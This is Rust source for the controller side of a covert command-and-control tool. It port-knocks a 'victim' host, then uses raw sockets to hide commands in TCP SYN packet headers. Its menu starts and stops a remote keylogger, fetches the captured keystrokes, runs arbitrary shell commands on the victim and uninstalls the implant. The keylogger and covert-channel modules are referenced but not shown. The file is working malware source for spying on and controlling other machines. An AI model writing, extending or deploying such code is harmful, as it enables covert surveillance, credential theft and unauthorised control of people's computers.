use std::io::{self, Write};
use std::sync::Arc;
use std::sync::atomic::{AtomicBool, Ordering};
use std::net::{TcpStream, IpAddr, Ipv4Addr};
use std::thread;
use std::time::Duration;
use pnet::transport::{transport_channel, TransportChannelType::Layer3, TransportSender, TransportReceiver};
use pnet::packet::ip::IpNextHeaderProtocols;
use pnet::packet::Packet;
use pnet::datalink;
use pnet::packet::tcp::TcpPacket;

mod port_knkr;
mod keylogger;
mod covert;

use port_knkr::KnockSession;

// Command Codes
const CMD_START_LOGGER:     u8 = 0x10;
const CMD_STOP_LOGGER:      u8 = 0x20;
const CMD_UNINSTALL:        u8 = 0x30;
const CMD_REQUEST_KEYLOG:   u8 = 0x50;

#[derive(Debug, PartialEq)]
enum SessionState {
    Disconnected,
    Connected,
}

struct Commander {
    state: SessionState,
    victim_ip: Option<Ipv4Addr>,
    local_ip: Option<Ipv4Addr>,
    knock_session: Option<KnockSession>,
    running: Arc<AtomicBool>,
    tx_port: u16,
    rx_port: u16,
}

impl Commander {
    fn new() -> Self {
        Self {
            state: SessionState::Disconnected,
            victim_ip: None,
            local_ip: None,
            knock_session: None,
            running: Arc::new(AtomicBool::new(false)),
            tx_port: 0,
            rx_port: 0,
        }
    }

   fn send_covert_data(&self, payload: &[u8]) {
        let victim_ip = self.victim_ip.expect("No victim IP");
        let local_ip = self.local_ip.expect("No local IP");
        
        // Convert payload into stateful chunks
        let mut state = covert::SenderState::new_from_bytes(payload);
        
        let protocol = Layer3(IpNextHeaderProtocols::Tcp);
        let (mut tx, mut rx) = transport_channel(65535, protocol).expect("Root required");
        let mut rx_iter = pnet::transport::ipv4_packet_iter(&mut rx);

        while state.has_next() && self.running.load(Ordering::SeqCst) {
            if let Some((ip_id, raw_word, masked_seq)) = state.chunk_to_send() {
                let mut acked = false;
                let mut attempts = 0;

                while !acked && attempts < 5 {
                    attempts += 1;
                    
                    // Build and send the SYN packet containing covert data
                    let syn_pkt = covert::build_syn_packet(
                        local_ip, victim_ip,
                        self.rx_port, self.tx_port, 
                        ip_id, masked_seq
                    );
                    
                    let _ = tx.send_to(
                        pnet::packet::ipv4::Ipv4Packet::new(&syn_pkt).unwrap(), 
                        IpAddr::V4(victim_ip)
                    );

                    let start = std::time::Instant::now();
                    // Wait 500ms for the Victim to respond with the signature
                    while start.elapsed() < Duration::from_millis(500) {
                        if let Ok((packet, _)) = rx_iter.next() {
                            // FIX: Use 'victim_ip' instead of 'target_ip'
                            if packet.get_source() == victim_ip {
                                // Optional Debug: See the flags coming from the victim
                                if let Some(tcp) = TcpPacket::new(packet.payload()) {
                                     // println!("[DEBUG] Packet from Victim. Flags: {:b}", tcp.get_flags());
                                }

                                if let Some(recv_id) = covert::parse_rst_ack_ip_id(packet.packet()) {
                                    let expected_sig = covert::signature_ip_id(ip_id, raw_word);
                                    if recv_id == expected_sig {
                                        state.ack();
                                        acked = true; // FIX: Use the 'acked' variable defined above
                                        break;
                                    } else {
                                        println!("[DEBUG] Sig mismatch: Got {}, Expected {}", recv_id, expected_sig);
                                    }
                                }
                            }
                        }
                    }
                    
                    if !acked {
                        println!("[!] Timeout (Chunk {}), retry {}/5...", state.index, attempts);
                    }
                }

                if !acked {
                    println!("[!!!] Connection lost or Victim is not ACKing. Aborting command.");
                    return;
                }
            }
        }
        println!("[+] Command sent successfully.");
    }

    pub fn run(&mut self) {
        println!("=== Covert C2 Commander ===");
        loop {
            match self.state {
                SessionState::Disconnected => self.disconnected_menu(),
                SessionState::Connected => self.connected_menu(),
            }
        }
    }

    fn disconnected_menu(&mut self) {
        println!("\n1) Initiate session (Port Knock)");
        println!("0) Exit");
        match prompt("Selection > ").as_str() {
            "1" => self.initiate_connection(),
            "0" => std::process::exit(0),
            _ => println!("[!] Invalid selection"),
        }
    }

    fn connected_menu(&mut self) {
        println!("\n--- Connected to {:?} ---", self.victim_ip);
        println!("1) Start Keylogger");
        println!("2) Stop Keylogger");
        println!("3) Request Keylog File");
        println!("4) Run Shell Command");
        println!("5) Uninstall");
        println!("6) Disconnect");
        match prompt("Selection > ").as_str() {
            "1" => self.start_keylogger(),
            "2" => self.stop_keylogger(),
            "3" => self.request_keylog_file(),
            "4" => self.run_program(),
            "5" => self.uninstall(),
            "6" => self.disconnect(),
            _ => println!("[!] Invalid selection"),
        }
    }

    // In main.rs

    fn initiate_connection(&mut self) {
        let target_ip_str = prompt("Target IP [127.0.0.1]: ");
        let ip = target_ip_str.parse::<Ipv4Addr>().unwrap_or(Ipv4Addr::new(127, 0, 0, 1));

        match port_knkr::port_knock(ip) {
            Ok(session) => {
                self.victim_ip = Some(ip);
                self.tx_port = session.tx_port;
                self.rx_port = session.rx_port;
                self.knock_session = Some(session);
                
                // FIX: Identify local IP and interface properly
                if let Some((iface_name, local_v4)) = Self::find_interface_for_target(ip) {
                    println!("[*] Using interface: {} with IP: {}", iface_name, local_v4);
                    self.local_ip = Some(local_v4);
                } else {
                    // Fallback to loopback if nothing else is found
                    println!("[!] Warning: Could not find best interface, falling back to 127.0.0.1");
                    self.local_ip = Some(Ipv4Addr::new(127, 0, 0, 1));
                }

                self.running.store(true, Ordering::SeqCst);
                self.state = SessionState::Connected;
                self.spawn_listener(); 
                println!("[+] Session Established.");
            }
            Err(e) => println!("[!] Knock failed: {}", e),
        }
    }

    // Improved interface selection logic
    fn find_interface_for_target(target: Ipv4Addr) -> Option<(String, Ipv4Addr)> {
        let interfaces = datalink::interfaces();
        
        // 1. Try to find an interface that is in the same subnet
        for iface in &interfaces {
            for ip_net in &iface.ips {
                if let IpAddr::V4(local_v4) = ip_net.ip() {
                    if ip_net.contains(IpAddr::V4(target)) {
                        return Some((iface.name.clone(), local_v4));
                    }
                }
            }
        }

        // 2. Fallback: Find the first non-loopback up interface
        for iface in &interfaces {
            if iface.is_up() && !iface.is_loopback() {
                for ip_net in &iface.ips {
                    if let IpAddr::V4(local_v4) = ip_net.ip() {
                        return Some((iface.name.clone(), local_v4));
                    }
                }
            }
        }

        None
    }

    fn spawn_listener(&self) {
        let running = self.running.clone();
        let target_ip = self.victim_ip.unwrap();
        let rx_port = self.rx_port;

        thread::spawn(move || {
            let protocol = Layer3(IpNextHeaderProtocols::Tcp);
            let (_, mut rx) = transport_channel(65535, protocol).expect("Root required");
            let mut rx_iter = pnet::transport::ipv4_packet_iter(&mut rx);
            let mut receiver_state = covert::ReceiverState::new();

            while running.load(Ordering::SeqCst) {
                if let Ok((packet, _)) = rx_iter.next() {
                    if packet.get_source() == target_ip {
                        if let Some(parsed) = covert::parse_syn_from_ipv4_packet(packet.packet()) {
                            if parsed.dst_port == rx_port {
                                if let Ok(_) = receiver_state.apply_chunk(parsed.ip_id, parsed.seq) {
                                    if receiver_state.complete {
                                        if let Ok(msg) = receiver_state.message_str() {
                                            println!("\n[Incoming] {}", msg);
                                        }
                                        receiver_state = covert::ReceiverState::new();
                                    }
                                }
                            }
                        }
                    }
                }
            }
        });
    }

    fn start_keylogger(&mut self) { self.send_covert_data(&[CMD_START_LOGGER]); }
    fn stop_keylogger(&mut self) { self.send_covert_data(&[CMD_STOP_LOGGER]); }
    fn request_keylog_file(&mut self) { self.send_covert_data(&[CMD_REQUEST_KEYLOG]); }
    fn run_program(&mut self) {
        let cmd = prompt("Command: ");
        if !cmd.is_empty() {
            println!("[*] Sending command...");
            self.send_covert_data(cmd.as_bytes());
            
            // 3️⃣ NOTIFY USER (Addresses point 3 of your analysis)
            println!("[*] Command sent. Waiting for response from listener thread...");
            // The output will be printed by the spawn_listener() thread 
            // whenever the victim sends the response chunks back.
        }
    }

    fn uninstall(&mut self) {
        self.send_covert_data(&[CMD_UNINSTALL]);
        self.disconnect();
    }
    fn disconnect(&mut self) {
        self.running.store(false, Ordering::SeqCst);
        self.state = SessionState::Disconnected;
    }

    fn find_best_interface(_target_ip: Ipv4Addr) -> Option<String> {
        datalink::interfaces().into_iter()
            .find(|i| i.is_up() && !i.is_loopback())
            .map(|i| i.name)
    }
}

fn prompt(msg: &str) -> String {
    print!("{}", msg);
    io::stdout().flush().unwrap();
    let mut input = String::new();
    io::stdin().read_line(&mut input).unwrap();
    input.trim().to_string()
}

fn main() {
    let mut commander = Commander::new();
    commander.run();
}
